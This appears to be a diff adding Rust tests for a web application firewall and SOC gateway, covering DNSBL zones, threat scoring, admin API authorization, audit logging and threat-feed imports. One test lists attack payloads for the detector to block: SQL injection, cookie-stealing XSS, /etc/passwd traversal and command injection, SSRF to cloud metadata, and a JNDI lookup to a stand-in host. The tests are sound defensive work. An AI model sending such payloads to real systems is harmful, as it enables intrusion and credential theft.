+            html.contains("id=\"threatsBody\""),
+            "threats table container missing"
+        );
+        // Create forms are wired to the real API endpoints.
+        assert!(
+            html.contains("data-url=\"/api/routes\""),
+            "add-route form missing"
+        );
+        assert!(
+            html.contains("data-url=\"/api/threats\""),
+            "add-threat form missing"
+        );
+        // Accessibility affordances present.
+        assert!(
+            html.contains("id=\"hcToggle\""),
+            "high-contrast toggle missing"
+        );
+        assert!(html.contains("Skip to content"), "skip link missing");
+        assert!(
+            html.contains(":focus-visible"),
+            "focus-visible styling missing"
+        );
+        assert!(
+            html.contains("aria-label=\"Console sections\""),
+            "section navigation landmark missing"
+        );
+        assert!(
+            html.contains("id=\"main\" tabindex=\"-1\""),
+            "skip-link target must be focusable"
+        );
+        assert!(
+            html.contains("aria-describedby=\"adminTokenHelp\""),
+            "admin token guidance missing"
+        );
+        assert!(
+            html.contains("role=\"status\" aria-live=\"polite\" aria-atomic=\"true\""),
+            "live KPI region should announce atomically"
+        );
+    }
+
+    #[test]
+    fn reverses_ipv4_for_dnsbl_zone_names() {
+        assert_eq!(reverse_ipv4_for_dnsbl([192, 0, 2, 10]), "10.2.0.192");
+    }
+
+    #[test]
+    fn exports_rfc5782_style_zone_records() {
+        let zone = export_dnsbl_zone(
+            "dnsbl.example",
+            &[
+                DnsblEntry {
+                    address: "192.0.2.10".parse().unwrap(),
+                    code: "127.0.0.2".to_string(),
+                    reason: "scanner".to_string(),
+                    source: "unit".to_string(),
+                    ttl_seconds: 300,
+                    prefix_len: None,
+                },
+                DnsblEntry {
+                    address: "2001:db8::10".parse().unwrap(),
+                    code: "127.0.0.2".to_string(),
+                    reason: "ipv6 skip".to_string(),
+                    source: "unit".to_string(),
+                    ttl_seconds: 300,
+                    prefix_len: None,
+                },
+            ],
+        );
+
+        assert!(zone.contains("$ORIGIN dnsbl.example."));
+        assert!(zone.contains("10.2.0.192 IN A 127.0.0.2"));
+        assert!(zone.contains("10.2.0.192 IN TXT \"scanner source=unit\""));
+        assert!(!zone.contains("ipv6 skip"));
+    }
+
+    #[test]
+    fn scores_threat_indicator_matches() {
+        // Uses a site-specific IoC that does NOT overlap a built-in signature,
+        // so this isolates the operator-configured indicator path.
+        let score = score_request(
+            "/callback",
+            Some("id=EVILCORP-C2-BEACON"),
+            "",
+            None,
+            &[ThreatIndicator {
+                value: "evilcorp-c2-beacon".to_string(),
+                indicator_type: "c2".to_string(),
+                severity: Severity::High,
+                source: "unit".to_string(),
+                ttl_seconds: 60,
+            }],
+            &[],
+        );
+
+        assert_eq!(score.score, 50);
+        assert!(score.reason.contains("c2 indicator"));
+    }
+
+    #[test]
+    fn builtin_waf_detects_common_attack_classes_without_configuration() {
+        // No operator-configured indicators and no DNSBL: every detection below
+        // must come from the built-in OWASP-shape signature layer alone.
+        let cases = [
+            ("/products", "id=1 UNION SELECT password FROM users", "sqli"),
+            (
+                "/search",
+                "q=<script>alert(document.cookie)</script>",
+                "xss",
+            ),
+            ("/download", "file=../../../../etc/passwd", "path-traversal"),
+            (
+                "/ping",
+                "host=127.0.0.1; cat /etc/passwd",
+                "command-injection",
+            ),
+            (
+                "/fetch",
+                "url=http://169.254.169.254/latest/meta-data",
+                "ssrf",
+            ),
+            ("/lookup", "x=${jndi:ldap://evil/a}", "deserialization"),
+        ];
+        for (path, query, class) in cases {
+            let scored = score_request(path, Some(query), "", None, &[], &[]);
+            assert!(
+                scored.score >= BLOCK_SCORE,
+                "{class} payload should reach block score, got {} ({})",
+                scored.score,
+                scored.reason
+            );
+            assert!(
+                scored.reason.contains(class),
+                "reason should name the {class} class, got: {}",
+                scored.reason
+            );
+        }
+
+        // A benign request must not be flagged by the built-in layer.
+        let benign = score_request("/account/profile", Some("tab=settings"), "", None, &[], &[]);
+        assert_eq!(benign.score, 0, "benign request scored: {}", benign.reason);
+        assert_eq!(benign.reason, "no matching indicator");
+    }
+
+    #[test]
+    fn scores_dnsbl_client_matches() {
+        let score = score_request(
+            "/",
+            None,
+            "",
+            Some("203.0.113.10".parse().unwrap()),
+            &[],
+            &[DnsblEntry {
+                address: "203.0.113.10".parse().unwrap(),
+                code: "127.0.0.2".to_string(),
+                reason: "known scanner".to_string(),
+                source: "unit".to_string(),
+                ttl_seconds: 300,
+                prefix_len: None,
+            }],
+        );
+
+        assert_eq!(score.score, 100);
+        assert!(score.reason.contains("DNSBL match"));
+    }
+
+    #[test]
+    fn ip_in_network_masks_by_prefix() {
+        let net: IpAddr = "203.0.113.0".parse().unwrap();
+        assert!(ip_in_network(net, 24, "203.0.113.200".parse().unwrap()));
+        assert!(ip_in_network(net, 24, "203.0.113.0".parse().unwrap()));
+        assert!(!ip_in_network(net, 24, "203.0.114.1".parse().unwrap()));
+        // /0 matches everything; a full /32 is an exact match.
+        assert!(ip_in_network(net, 0, "8.8.8.8".parse().unwrap()));
+        assert!(!ip_in_network(net, 32, "203.0.113.1".parse().unwrap()));
+        // Mixed address families never match.
+        assert!(!ip_in_network(net, 24, "2001:db8::1".parse().unwrap()));
+        // IPv6 prefix masking.
+        let net6: IpAddr = "2001:db8::".parse().unwrap();
+        assert!(ip_in_network(
+            net6,
+            32,
+            "2001:db8:dead:beef::1".parse().unwrap()
+        ));
+        assert!(!ip_in_network(net6, 32, "2001:db9::1".parse().unwrap()));
+        // IPv6 /0 matches everything.
+        assert!(ip_in_network(net6, 0, "fe80::1".parse().unwrap()));
+    }
+
+    #[test]
+    fn scores_dnsbl_cidr_subnet_matches() {
+        // A /24 DNSBL entry blocks any client IP inside the subnet.
+        let entry = DnsblEntry {
+            address: "198.51.100.0".parse().unwrap(),
+            code: "127.0.0.2".to_string(),
+            reason: "botnet subnet".to_string(),
+            source: "unit".to_string(),
+            ttl_seconds: 300,
+            prefix_len: Some(24),
+        };
+        let inside = score_request(
+            "/",
+            None,
+            "",
+            Some("198.51.100.77".parse().unwrap()),
+            &[],
+            std::slice::from_ref(&entry),
+        );
+        assert_eq!(inside.score, 100);
+        assert!(inside.reason.contains("DNSBL match"));
+
+        let outside = score_request(
+            "/",
+            None,
+            "",
+            Some("198.51.101.77".parse().unwrap()),
+            &[],
+            std::slice::from_ref(&entry),
+        );
+        assert_eq!(outside.score, 0);
+    }
+
+    #[test]
+    fn validate_dnsbl_checks_prefix_len() {
+        let base = DnsblEntry {
+            address: "10.0.0.0".parse().unwrap(),
+            code: "127.0.0.2".to_string(),
+            reason: "range".to_string(),
+            source: "unit".to_string(),
+            ttl_seconds: 60,
+            prefix_len: Some(24),
+        };
+        assert!(validate_dnsbl(&base).is_ok());
+        let too_wide = DnsblEntry {
+            prefix_len: Some(40),
+            ..base.clone()
+        };
+        assert_eq!(
+            validate_dnsbl(&too_wide),
+            Err("DNSBL prefix_len exceeds the address family width")
+        );
+        // IPv6 permits prefixes up to /128.
+        let v6 = DnsblEntry {
+            address: "2001:db8::".parse().unwrap(),
+            prefix_len: Some(64),
+            ..base.clone()
+        };
+        assert!(validate_dnsbl(&v6).is_ok());
+    }
+
+    #[test]
+    fn builds_upstream_target_from_route_prefix() {
+        assert_eq!(
+            upstream_target(&route(), "/api/v1/items", Some("limit=1")).unwrap(),
+            "https://origin.example/v1/items?limit=1"
+        );
+        assert_eq!(
+            upstream_target(&route(), "/api", None).unwrap(),
+            "https://origin.example/"
+        );
+        assert_eq!(
+            upstream_target(&route(), "relative", None).unwrap(),
+            "https://origin.example/relative"
+        );
+        assert_eq!(
+            upstream_target(
+                &RouteConfig {
+                    upstream: "mock://origin".to_string(),
+                    ..route()
+                },
+                "/api",
+                None,
+            )
+            .unwrap_err(),
+            "upstream must use http:// or https:// for proxy mode"
+        );
+    }
+
+    #[test]
+    fn selects_longest_enabled_route_prefix() {
+        let routes = vec![
+            route(),
+            RouteConfig {
+                id: "admin".to_string(),
+                path_prefix: "/api/admin".to_string(),
+                upstream: "mock://admin".to_string(),
+                mode: EnforcementMode::Monitor,
+                enabled: true,
+                block_threshold: None,
+            },
+        ];
+
+        assert_eq!(
+            select_route(&routes, "/api/admin/users").unwrap().id,
+            "admin"
+        );
+    }
+
+    #[tokio::test]
+    async fn admin_api_gateway_and_dnsbl_surfaces_work_together() {
+        let path = temp_state_path("api");
+        let state = AppState::load(AppConfig {
+            admin_token: Some("secret".to_string()),
+            state_path: Some(path.clone()),
+            dnsbl_origin: "dnsbl.example.".to_string(),
+            event_limit: 10,
+        })
+        .await
+        .unwrap();
+        let app = build_app(state);
+
+        let response = app_request(&app, empty_request(Method::GET, "/admin")).await;
+        assert_eq!(response.status(), StatusCode::OK);
+        assert!(body_text(response).await.contains("WAF/IDS/AI SOC Gateway"));
+
+        let health: HealthStatus =
+            json_body(app_request(&app, empty_request(Method::GET, "/healthz")).await).await;
+        assert_eq!(health.persistence, "file");
+        assert_eq!(health.dnsbl_origin, "dnsbl.example");
+
+        let block_route = RouteConfig {
+            id: "secure".to_string(),
+            path_prefix: "/secure".to_string(),
+            upstream: "mock://secure".to_string(),
+            mode: EnforcementMode::Block,
+            enabled: true,
+            block_threshold: None,
+        };
+        let response = app_request(
+            &app,
+            json_request(Method::POST, "/api/routes", None, &block_route),
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::UNAUTHORIZED);
+
+        let response = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/routes",
+                Some("secret"),
+                &RouteConfig {
+                    path_prefix: "secure".to_string(),
+                    ..block_route.clone()
+                },
+            ),
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::BAD_REQUEST);
+
+        let saved_route: RouteConfig = json_body(
+            app_request(
+                &app,
+                json_request(Method::POST, "/api/routes", Some("secret"), &block_route),
+            )
+            .await,
+        )
+        .await;
+        assert_eq!(saved_route.id, "secure");
+
+        let updated_route: RouteConfig = json_body(
+            app_request(
+                &app,
+                json_request(
+                    Method::POST,
+                    "/api/routes",
+                    Some("secret"),
+                    &RouteConfig {
+                        upstream: "mock://secure-v2".to_string(),
+                        ..block_route.clone()
+                    },
+                ),
+            )
+            .await,
+        )
+        .await;
+        assert_eq!(updated_route.upstream, "mock://secure-v2");
+
+        let threat = ThreatIndicator {
+            value: "drop table".to_string(),
+            indicator_type: "sqli".to_string(),
+            severity: Severity::Critical,
+            source: "unit".to_string(),
+            ttl_seconds: 60,
+        };
+        let response = app_request(
+            &app,
+            json_request(Method::POST, "/api/threats", None, &threat),
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::UNAUTHORIZED);
+
+        let response = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threats",
+                Some("secret"),
+                &ThreatIndicator {
+                    value: " ".to_string(),
+                    ..threat.clone()
+                },
+            ),
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::BAD_REQUEST);
+
+        let saved_threat: ThreatIndicator = json_body(
+            app_request(
+                &app,
+                json_request(Method::POST, "/api/threats", Some("secret"), &threat),
+            )
+            .await,
+        )
+        .await;
+        assert_eq!(saved_threat.value, "drop table");
+
+        let dnsbl = DnsblEntry {
+            address: "198.51.100.7".parse().unwrap(),
+            code: "127.0.0.9".to_string(),
+            reason: "botnet".to_string(),
+            source: "unit".to_string(),
+            ttl_seconds: 300,
+            prefix_len: None,
+        };
+        let response =
+            app_request(&app, json_request(Method::POST, "/api/dnsbl", None, &dnsbl)).await;
+        assert_eq!(response.status(), StatusCode::UNAUTHORIZED);
+
+        let response = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/dnsbl",
+                Some("secret"),
+                &DnsblEntry {
+                    code: "not-ip".to_string(),
+                    ..dnsbl.clone()
+                },
+            ),
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::BAD_REQUEST);
+
+        let saved_dnsbl: DnsblEntry = json_body(
+            app_request(
+                &app,
+                json_request(Method::POST, "/api/dnsbl", Some("secret"), &dnsbl),
+            )
+            .await,
+        )
+        .await;
+        assert_eq!(saved_dnsbl.code, "127.0.0.9");
+
+        let gateway_request = Request::builder()
+            .method(Method::POST)
+            .uri("/gateway/secure/login?q=DROP%20TABLE")
+            .header("x-forwarded-for", "198.51.100.7, 10.0.0.1")
+            .body(Body::from("payload"))
+            .unwrap();
+        let response = app_request(&app, gateway_request).await;
+        assert_eq!(response.status(), StatusCode::FORBIDDEN);
+        assert!(body_text(response).await.contains("\"action\":\"blocked\""));
+
+        let routes: Vec<RouteConfig> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/routes")).await).await;
+        assert!(routes.iter().any(|route| route.id == "secure"));
+
+        let threats: Vec<ThreatIndicator> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/threats")).await).await;
+        assert!(threats.iter().any(|item| item.value == "drop table"));
+
+        let dnsbl_entries: Vec<DnsblEntry> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/dnsbl")).await).await;
+        assert!(
+            dnsbl_entries
+                .iter()
+                .any(|entry| entry.address == "198.51.100.7".parse::<IpAddr>().unwrap())
+        );
+
+        let events: Vec<SecurityEvent> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/events")).await).await;
+        assert_eq!(events.last().unwrap().action, "blocked");
+        assert_eq!(
+            events.last().unwrap().client_ip,
+            Some("198.51.100.7".parse().unwrap())
+        );
+        let events_export =
+            body_text(app_request(&app, empty_request(Method::GET, "/api/events.ndjson")).await)
+                .await;
+        assert!(events_export.contains(r#""action":"blocked""#));
+        assert!(events_export.ends_with('\n'));
+
+        let kpis: SocKpiSnapshot =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/kpis")).await).await;
+        assert_eq!(kpis.blocked_event_count, 1);
+        assert_eq!(kpis.threat_feed_count, 0);
+        assert_eq!(kpis.fresh_threat_feed_count, 0);
+        assert_eq!(kpis.stale_threat_feed_count, 0);
+
+        let zone =
+            body_text(app_request(&app, empty_request(Method::GET, "/dnsbl/zone")).await).await;
+        assert!(zone.contains("$ORIGIN dnsbl.example."));
+        assert!(zone.contains("7.100.51.198 IN A 127.0.0.9"));
+
+        let _ = fs::remove_file(path).await;
+    }
+
+    #[tokio::test]
+    async fn audit_logs_record_successful_admin_writes_without_tokens() {
+        let path = temp_state_path("audit");
+        let state = AppState::load(AppConfig {
+            admin_token: Some("secret".to_string()),
+            state_path: Some(path.clone()),
+            dnsbl_origin: "dnsbl.example".to_string(),
+            event_limit: 10,
+        })
+        .await
+        .unwrap();
+        let app = build_app(state);
+        let route = RouteConfig {
+            id: "audit-route".to_string(),
+            path_prefix: "/audit".to_string(),
+            upstream: "mock://audit".to_string(),
+            mode: EnforcementMode::Monitor,
+            enabled: true,
+            block_threshold: None,
+        };
+
+        let unauthorized = app_request(
+            &app,
+            json_request(Method::POST, "/api/routes", None, &route),
+        )
+        .await;
+        assert_eq!(unauthorized.status(), StatusCode::UNAUTHORIZED);
+
+        let response = app
+            .clone()
+            .oneshot(
+                Request::builder()
+                    .method(Method::POST)
+                    .uri("/api/routes")
+                    .header("content-type", "application/json")
+                    .header("x-admin-token", "secret")
+                    .header("x-admin-actor", "operator@example.com")
+                    .body(Body::from(serde_json::to_vec(&route).unwrap()))
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(response.status(), StatusCode::CREATED);
+
+        let logs: Vec<AuditLogEntry> = json_body(
+            app_request(
+                &app,
+                authed_empty_request(Method::GET, "/api/audit-logs", "secret"),
+            )
+            .await,
+        )
+        .await;
+        assert_eq!(logs.len(), 1);
+        assert_eq!(logs[0].actor, "operator@example.com");
+        assert_eq!(logs[0].action, "upsert_route");
+        assert_eq!(logs[0].resource, "route");
+        assert_eq!(logs[0].resource_id, "audit-route");
+        assert_eq!(logs[0].outcome, "success");
+        assert!(!serde_json::to_string(&logs).unwrap().contains("secret"));
+
+        let persisted: AppData =
+            serde_json::from_str(&fs::read_to_string(&path).await.unwrap()).unwrap();
+        assert_eq!(persisted.audit_logs.len(), 1);
+        let persisted_json = serde_json::to_string(&persisted.audit_logs).unwrap();
+        assert!(!persisted_json.contains("secret"));
+        let _ = fs::remove_file(path).await;
+    }
+
+    #[tokio::test]
+    async fn commercial_license_feed_readiness_and_bundle_surfaces_work() {
+        let path = temp_state_path("commercial");
+        let state = AppState::load(AppConfig {
+            admin_token: Some("secret".to_string()),
+            state_path: Some(path.clone()),
+            dnsbl_origin: "dnsbl.example".to_string(),
+            event_limit: 10,
+        })
+        .await
+        .unwrap();
+        let app = build_app(state);
+
+        let initial_readiness: CommercialReadiness = json_body(
+            app_request(
+                &app,
+                empty_request(Method::GET, "/api/commercial/readiness"),
+            )
+            .await,
+        )
+        .await;
+        assert!(!initial_readiness.ready_for_enterprise_sale);
+        assert_eq!(initial_readiness.readiness_level, "implementation_required");
+        assert!(
+            initial_readiness
+                .blockers
+                .iter()
+                .any(|item| item == "license")
+        );
+
+        let initial_license: CommercialProfile = json_body(
+            app_request(&app, empty_request(Method::GET, "/api/commercial/license")).await,
+        )
+        .await;
+        assert_eq!(initial_license.license_status, LicenseStatus::Unlicensed);
+
+        let profile = enterprise_profile();
+        let unauthorized = app_request(
+            &app,
+            json_request(Method::POST, "/api/commercial/license", None, &profile),
+        )
+        .await;
+        assert_eq!(unauthorized.status(), StatusCode::UNAUTHORIZED);
+
+        let bad_profile = CommercialProfile {
+            features: Vec::new(),
+            ..profile.clone()
+        };
+        let invalid = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/commercial/license",
+                Some("secret"),
+                &bad_profile,
+            ),
+        )
+        .await;
+        assert_eq!(invalid.status(), StatusCode::BAD_REQUEST);
+
+        let saved_profile: CommercialProfile = json_body(
+            app_request(
+                &app,
+                json_request(
+                    Method::POST,
+                    "/api/commercial/license",
+                    Some("secret"),
+                    &profile,
+                ),
+            )
+            .await,
+        )
+        .await;
+        assert_eq!(saved_profile.annual_contract_value_krw, Some(2_000_000_000));
+
+        let feed = threat_feed_import();
+        let unauthorized_feed = app_request(
+            &app,
+            json_request(Method::POST, "/api/threat-feeds/import", None, &feed),
+        )
+        .await;
+        assert_eq!(unauthorized_feed.status(), StatusCode::UNAUTHORIZED);
+
+        let empty_feed = ThreatFeedImport {
+            threats: Vec::new(),
+            dnsbl: Vec::new(),
+            ..feed.clone()
+        };
+        let invalid_feed = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-feeds/import",
+                Some("secret"),
+                &empty_feed,
+            ),
+        )
+        .await;
+        assert_eq!(invalid_feed.status(), StatusCode::BAD_REQUEST);
+
+        let import_result: ThreatFeedImportResult = json_body(
+            app_request(
+                &app,
+                json_request(
+                    Method::POST,
+                    "/api/threat-feeds/import",
+                    Some("secret"),
+                    &feed,
+                ),
+            )
+            .await,
+        )
+        .await;
+        assert_eq!(import_result.feed_id, "misp-seoul");
+        assert_eq!(import_result.upserted_threats, 1);
+        assert_eq!(import_result.upserted_dnsbl, 1);
+
+        let gateway_response = app_request(
+            &app,
+            empty_request(Method::GET, "/gateway/demo?q=union%20select"),
+        )
+        .await;
+        assert_eq!(gateway_response.status(), StatusCode::OK);
+
+        let feeds: Vec<ThreatFeedStatus> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/threat-feeds")).await)
+                .await;
+        assert_eq!(feeds.len(), 1);
+        assert_eq!(feeds[0].feed_id, "misp-seoul");
+        let freshness: Vec<ThreatFeedFreshness> = json_body(
+            app_request(
+                &app,
+                empty_request(Method::GET, "/api/threat-feeds/freshness"),
+            )
+            .await,
+        )
+        .await;
+        assert_eq!(freshness.len(), 1);
+        assert_eq!(freshness[0].feed_id, "misp-seoul");
+        assert!(!freshness[0].stale);
+
+        let final_readiness: CommercialReadiness = json_body(
+            app_request(
+                &app,
+                empty_request(Method::GET, "/api/commercial/readiness"),
+            )
+            .await,
+        )
+        .await;
+        assert!(final_readiness.ready_for_enterprise_sale);
+        assert_eq!(final_readiness.readiness_level, "sale_ready");
+        assert!(final_readiness.blockers.is_empty());
+        assert!(
+            final_readiness
+                .deployment_assets
+                .iter()
+                .any(|path| path == "Dockerfile")
+        );
+
+        let manifest: BuyerEvidenceManifest = json_body(
+            app_request(
+                &app,
+                empty_request(Method::GET, "/api/commercial/evidence-manifest"),
+            )
+            .await,
+        )
+        .await;
+        assert!(manifest.ready_for_enterprise_sale);
+        assert_eq!(manifest.target_sale_value_krw, TARGET_SALE_VALUE_KRW);
+        assert_eq!(manifest.runtime_counts.threat_feed_count, 1);
+        assert_eq!(manifest.runtime_counts.fresh_threat_feed_count, 1);
+        assert!(
+            manifest
+                .required_endpoints
+                .iter()
+                .any(|endpoint| endpoint.path == "/api/events.ndjson"
+                    && endpoint.content_type == "application/x-ndjson"
+                    && endpoint.required_for_sale)
+        );
+        assert!(
+            manifest
+                .required_endpoints
+                .iter()
+                .any(|endpoint| endpoint.path == "/api/audit-logs" && endpoint.required_for_sale)
+        );
+        assert!(
+            manifest
+                .document_paths
+                .iter()
+                .any(|path| path == "docs/figma/enterprise-product-architecture.md")
+        );
+
+        let support: SupportBundle =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/support-bundle")).await)
+                .await;
+        assert!(support.generated_at_unix > 0);
+        assert!(support.readiness.ready_for_enterprise_sale);
+        assert!(support.evidence_manifest.ready_for_enterprise_sale);
+        assert!(
+            support
+                .evidence_manifest
+                .required_endpoints
+                .iter()
+                .any(|endpoint| endpoint.path == "/api/commercial/evidence-manifest")
+        );
+        assert_eq!(
+            support.commercial.license_id,
+            Some("LIC-2B-KRW-0001".to_string())
+        );
+        assert_eq!(support.threat_feed_count, 1);
+        assert_eq!(support.kpis.fresh_threat_feed_count, 1);
+        assert_eq!(support.kpis.stale_threat_feed_count, 0);
+        assert!(support.audit_log_count >= 2);
+        assert_eq!(support.threat_feed_freshness.len(), 1);
+        assert!(!support.threat_feed_freshness[0].stale);
+        assert!(support.event_count >= 1);
+
+        let persisted: AppData =
+            serde_json::from_str(&fs::read_to_string(&path).await.unwrap()).unwrap();
+        assert_eq!(persisted.commercial.license_status, LicenseStatus::Active);
+        assert_eq!(persisted.threat_feeds.len(), 1);
+        let _ = fs::remove_file(path).await;
+    }
+
+    #[tokio::test]
+    async fn phishing_database_import_endpoint_supports_blocking_flow() {
+        let feed_mock = Router::new()
+            .route(
+                "/domains",
+                get(|| async {
+                    (
+                        StatusCode::OK,
+                        "evil.example\nhttps://evil.example/path\nlogin.bad.example\n",
+                    )
+                }),
+            )
+            .route(
+                "/ips",
+                get(|| async { (StatusCode::OK, "198.51.100.200\n203.0.113.77\nbad-ip\n") }),
+            );
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let addr = listener.local_addr().unwrap();
+        tokio::spawn(axum::serve(listener, feed_mock).into_future());
+
+        let app = build_app(AppState::seeded(Some("secret".to_string())));
+        let payload = phishing_database_import_request(&format!("http://{addr}"));
+
+        let unauthorized = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-feeds/import/phishing-database",
+                None,
+                &payload,
+            ),
+        )
+        .await;
+        assert_eq!(unauthorized.status(), StatusCode::UNAUTHORIZED);
+
+        let invalid_request = PhishingDatabaseImportRequest {
+            ttl_seconds: 0,
+            domain_url: "file:///tmp/not-allowed".to_string(),
+            ..payload.clone()
+        };
+        let invalid = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-feeds/import/phishing-database",
+                Some("secret"),
+                &invalid_request,
+            ),
+        )
+        .await;
+        assert_eq!(invalid.status(), StatusCode::BAD_REQUEST);
+
+        let import_result: ThreatFeedImportResult = json_body(
+            app_request(
+                &app,
+                json_request(
+                    Method::POST,
+                    "/api/threat-feeds/import/phishing-database",
+                    Some("secret"),
+                    &payload,
+                ),
+            )
+            .await,
+        )
+        .await;
+        assert_eq!(import_result.feed_id, "phishing-db-seoul");
+        assert_eq!(import_result.upserted_threats, 2);
+        assert_eq!(import_result.upserted_dnsbl, 2);
+        let audit_logs: Vec<AuditLogEntry> = json_body(
+            app_request(
+                &app,
+                authed_empty_request(Method::GET, "/api/audit-logs", "secret"),
+            )
+            .await,
+        )
+        .await;
+        assert!(
+            audit_logs
+                .iter()
+                .any(|item| item.action == "import_phishing_database_feed")
+        );
+
+        let threat_entries: Vec<ThreatIndicator> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/threats")).await).await;
+        assert!(threat_entries.iter().any(
+            |entry| entry.value == "evil.example" && entry.indicator_type == "phishing_domain"
+        ));
+        assert!(
+            threat_entries
+                .iter()
+                .any(|entry| entry.value == "login.bad.example"
+                    && entry.source == "phishing-db-seoul")
+        );
+
+        let dnsbl_entries: Vec<DnsblEntry> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/dnsbl")).await).await;
+        assert!(
+            dnsbl_entries
+                .iter()
+                .any(|entry| entry.address == "198.51.100.200".parse::<IpAddr>().unwrap())
+        );
+        assert!(
+            dnsbl_entries
+                .iter()
+                .any(|entry| entry.address == "203.0.113.77".parse::<IpAddr>().unwrap())
+        );
+
+        let block_route = RouteConfig {
+            id: "phish".to_string(),
+            path_prefix: "/phish".to_string(),
+            upstream: "mock://phish".to_string(),
+            mode: EnforcementMode::Block,
+            enabled: true,
+            block_threshold: Some(50),
+        };
+        let route_response = app_request(
+            &app,
+            json_request(Method::POST, "/api/routes", Some("secret"), &block_route),
+        )
+        .await;
+        assert_eq!(route_response.status(), StatusCode::CREATED);
+
+        let blocked = app_request(
+            &app,
+            empty_request(
+                Method::GET,
+                "/gateway/phish?q=https%3A%2F%2Fevil.example%2Flogin",
+            ),
+        )
+        .await;
+        assert_eq!(blocked.status(), StatusCode::FORBIDDEN);
+    }
+
+    #[tokio::test]
+    async fn phishing_database_import_rejects_redirected_feed_fetches() {
+        let target_feed = Router::new()
+            .route(
+                "/domains",
+                get(|| async { (StatusCode::OK, "evil.example\n") }),
+            )
+            .route(
+                "/ips",
+                get(|| async { (StatusCode::OK, "198.51.100.200\n") }),
+            );
+        let target_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let target_addr = target_listener.local_addr().unwrap();
+        tokio::spawn(axum::serve(target_listener, target_feed).into_future());
+
+        let redirect_domains = format!("http://{target_addr}/domains");
+        let redirect_ips = format!("http://{target_addr}/ips");
+        let redirect_feed = Router::new()
+            .route(
+                "/domains",
+                get(move || {
+                    let location = redirect_domains.clone();
+                    async move { (StatusCode::FOUND, [("location", location)]) }
+                }),
+            )
+            .route(
+                "/ips",
+                get(move || {
+                    let location = redirect_ips.clone();
+                    async move { (StatusCode::FOUND, [("location", location)]) }
+                }),
+            );
+        let redirect_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let redirect_addr = redirect_listener.local_addr().unwrap();
+        tokio::spawn(axum::serve(redirect_listener, redirect_feed).into_future());
+
+        let app = build_app(AppState::seeded(Some("secret".to_string())));
+        let payload = phishing_database_import_request(&format!("http://{redirect_addr}"));
+
+        let response = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-feeds/import/phishing-database",
+                Some("secret"),
+                &payload,
+            ),
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::BAD_GATEWAY);
+    }
+
+    #[tokio::test]
+    async fn kev_feed_import_endpoint_maps_catalog_to_cve_indicators() {
+        let catalog = serde_json::json!({
+            "title": "CISA Catalog of Known Exploited Vulnerabilities",
+            "catalogVersion": "2026.08.27",
+            "dateReleased": "2026-08-27T17:00:36.6632Z",
+            "count": 2,
+            "vulnerabilities": [
+                {
+                    "cveID": "CVE-2023-49105",
+                    "vendorProject": "ownCloud",
+                    "product": "ownCloud",
+                    "vulnerabilityName": "ownCloud Improper Authentication Vulnerability",
+                    "dateAdded": "2026-08-27",
+                    "shortDescription": "desc",
+                    "requiredAction": "action",
+                    "dueDate": "2026-08-30",
+                    "knownRansomwareCampaignUse": "Unknown",
+                    "notes": "",
+                    "cwes": ["CWE-287"]
+                },
+                {
+                    "cveID": "CVE-2021-44228",
+                    "vendorProject": "Apache",
+                    "product": "Log4j2",
+                    "vulnerabilityName": "Apache Log4j2 RCE",
+                    "dateAdded": "2021-12-10",
+                    "shortDescription": "desc",
+                    "requiredAction": "action",
+                    "dueDate": "2021-12-24",
+                    "knownRansomwareCampaignUse": "Known",
+                    "notes": "",
+                    "cwes": ["CWE-917"]
+                }
+            ]
+        });
+        let feed_mock = Router::new().route(
+            "/kev.json",
+            get(move || {
+                let body = catalog.to_string();
+                async move { (StatusCode::OK, body) }
+            }),
+        );
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let addr = listener.local_addr().unwrap();
+        tokio::spawn(axum::serve(listener, feed_mock).into_future());
+
+        let app = build_app(
+            AppState::seeded(Some("secret".to_string()))
+                .with_kev_catalog_url(format!("http://{addr}/kev.json")),
+        );
+        let payload = kev_import_request();
+
+        let unauthorized = app_request(
+            &app,
+            json_request(Method::POST, "/api/threat-intel/cisa-kev", None, &payload),
+        )
+        .await;
+        assert_eq!(unauthorized.status(), StatusCode::UNAUTHORIZED);
+
+        let invalid_request = KevImportRequest {
+            ttl_seconds: 0,
+            ..payload.clone()
+        };
+        let invalid = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-intel/cisa-kev",
+                Some("secret"),
+                &invalid_request,
+            ),
+        )
+        .await;
+        assert_eq!(invalid.status(), StatusCode::BAD_REQUEST);
+
+        let import_result: ThreatFeedImportResult = json_body(
+            app_request(
+                &app,
+                json_request(
+                    Method::POST,
+                    "/api/threat-intel/cisa-kev",
+                    Some("secret"),
+                    &payload,
+                ),
+            )
+            .await,
+        )
+        .await;
+        assert_eq!(import_result.feed_id, "cisa-kev-seoul");
+        assert_eq!(import_result.upserted_threats, 2);
+        assert_eq!(import_result.upserted_dnsbl, 0);
+
+        let audit_logs: Vec<AuditLogEntry> = json_body(
+            app_request(
+                &app,
+                authed_empty_request(Method::GET, "/api/audit-logs", "secret"),
+            )
+            .await,
